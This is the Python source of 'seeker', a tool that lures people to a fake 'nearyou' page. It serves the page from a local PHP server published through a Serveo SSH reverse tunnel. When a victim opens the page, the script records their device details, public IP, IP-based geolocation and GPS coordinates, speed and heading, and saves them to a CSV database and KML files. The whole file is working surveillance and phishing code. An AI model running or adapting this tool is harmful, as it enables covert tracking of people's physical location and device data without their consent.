#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Provide Subdomain for Serveo URL ( Optional )')
parser.add_argument('-k', '--kml', help='Provide KML Filename ( Optional )')
parser.add_argument('-t', '--tunnel', help='Specify Tunnel Mode [default, manual]', required=True)
args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
tunnel_mode = args.tunnel

result = 'template/nearyou/php/result.txt'
info = 'template/nearyou/php/info.txt'
site = 'nearyou'
row = []
version = '1.1.8'

def banner():
	os.system('clear')
	print (G +
	r'''
                        __
  ______  ____   ____  |  | __  ____ _______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/
/____  > \___  >\___  >|__|_ \ \___  >|__|
	 \/      \/     \/      \/     \/        ''' + W)
	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t')
	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')

def ver_check():
	print(G + '[+]' + C + ' Checking for Updates.....', end='')
	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
	ver_rqst = requests.get(ver_url)
	ver_sc = ver_rqst.status_code
	if ver_sc == 200:
		github_ver = ver_rqst.text
		github_ver = github_ver.strip()

		if version == github_ver:
			print(C + '[' + G + ' Up-To-Date ' + C +']' + '\n')
		else:
			print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
	else:
		print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')

def tunnel_select():
	if tunnel_mode == 'default':
		serveo()
	elif tunnel_mode == 'manual':
		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W)
		print(G + '[+]' + C + ' Append ' + W + '/nearyou/' + C + ' to tunnel URL...' + W)
	else:
		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
		exit()

def serveo():
	global site, subdom
	flag = False

	print(G + '[+]' + C + ' Checking Serveo Status...', end='')

	try:
		time.sleep(1)
		rqst = requests.get('https://serveo.net', timeout=5)
		sc = rqst.status_code
		if sc == 200:
			print(C + '[' + G + ' UP ' + C + ']' + W + '\n')
		else:
			print(C + '[' + R + 'Status : {}'.format(sc) + C + ']' + W + '\n')
			exit()
	except requests.ConnectionError:
		print(C + '[' + R + ' DOWN ' + C + ']' + W + '\n')
		exit()
			
	print(G + '[+]' + C + ' Getting Serveo URL...' + W + '\n')
	if subdom is None:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '80:localhost:8080', 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	else:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-oStrictHostKeyChecking=no', '-R', '{}.serveo.net:80:localhost:8080'.format(subdom), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	while True:
		
		time.sleep(2)
		with open('logs/serveo.txt', 'r') as tmpfile:
			try:
				stdout = tmpfile.readlines()
				if flag == False:
					for elem in stdout:
						if 'HTTP' in elem:
							elem = elem.split(' ')
							url = elem[4].strip()
							url = url + '/{}/'.format(site)
							print(G + '[+]' + C + ' URL : ' + W + url)
							flag = True
						else:
							pass
				elif flag == True:
					break
			except Exception as e:
				print(e)
				pass

def server():
	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '127.0.0.1:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://127.0.0.1:8080/nearyou/index.html')
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Success ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Status : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Failed ' + C + ']' + W)
		Quit()

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Waiting for User Interaction...' + W + '\n')
			printed = True
		if size > 0:
			main()

def main():
	global result, row, var_lat, var_lon
	try:
		row = []
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:

				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'Not Available'
				var_ram = value['ram']
				var_vendor = value['vendor']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']

				row.append(var_os)
				row.append(var_platform) 
				row.append(var_cores) 
				row.append(var_ram) 
				row.append(var_vendor)
				row.append(var_render)
				row.append(var_res)
				row.append(var_browser)
				row.append(var_ip)

				print(G + '[+]' + C + ' Device Information : ' + W + '\n')
				print(G + '[+]' + C + ' OS         : ' + W + var_os)
				print(G + '[+]' + C + ' Platform   : ' + W + var_platform)
				print(G + '[+]' + C + ' CPU Cores  : ' + W + var_cores)
				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
				print(G + '[+]' + C + ' GPU Vendor : ' + W + var_vendor)
				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
				print(G + '[+]' + C + ' Resolution : ' + W + var_res)
				print(G + '[+]' + C + ' Browser    : ' + W + var_browser)
				print(G + '[+]' + C + ' Public IP  : ' + W + var_ip)

				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				sc = rqst.status_code

				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					var_continent = str(data['continent'])
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_org = str(data['org'])
					var_isp = str(data['isp'])

					row.append(var_continent)
					row.append(var_country)
					row.append(var_region)
					row.append(var_city)
					row.append(var_org)
					row.append(var_isp)

					print(G + '[+]' + C + ' Continent  : ' + W + var_continent)
					print(G + '[+]' + C + ' Country    : ' + W + var_country)
					print(G + '[+]' + C + ' Region     : ' + W + var_region)
					print(G + '[+]' + C + ' City       : ' + W + var_city)
					print(G + '[+]' + C + ' Org        : ' + W + var_org)
					print(G + '[+]' + C + ' ISP        : ' + W + var_isp)
	except ValueError:
		pass
	
	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'

				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'Not Available'
				else:
					var_alt == value['alt'] + ' m'
				
				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'Not Available'
				else:
					var_dir = value['dir'] + ' deg'
				
				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'Not Available'
				else:
					var_spd = value['spd'] + ' m/s'

				row.append(var_lat)
				row.append(var_lon)
				row.append(var_acc)
				row.append(var_alt)
				row.append(var_dir)
				row.append(var_spd)

				print ('\n' + G + '[+]' + C + ' Location Information : ' + W + '\n')
				print (G + '[+]' + C + ' Latitude  : ' + W + var_lat)
				print (G + '[+]' + C + ' Longitude : ' + W + var_lon)
				print (G + '[+]' + C + ' Accuracy  : ' + W + var_acc)
				print (G + '[+]' + C + ' Altitude  : ' + W + var_alt)
				print (G + '[+]' + C + ' Direction : ' + W + var_dir)
				print (G + '[+]' + C + ' Speed     : ' + W + var_spd)
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	print ('\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
	
	if kml_fname is not None:
		kmlout(var_lat, var_lon)

	csvout()
	repeat()

def kmlout(var_lat, var_lon):
	with open('template/sample.kml', 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(G + '[+]' + C + ' KML File Generated..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))

def csvout():
	global row
	with open('db/results.csv', 'a') as csvfile:
		writer = csv.writer(csvfile)
		writer.writerow(row)
	print(G + '[+]' + C + ' New Entry Added in Database.: ' + W + os.getcwd() + '/results.csv')

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def Quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()

try:
	banner()
	ver_check()
	tunnel_select()
	server()
	wait()
	main()

except KeyboardInterrupt:
	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
	Quit()
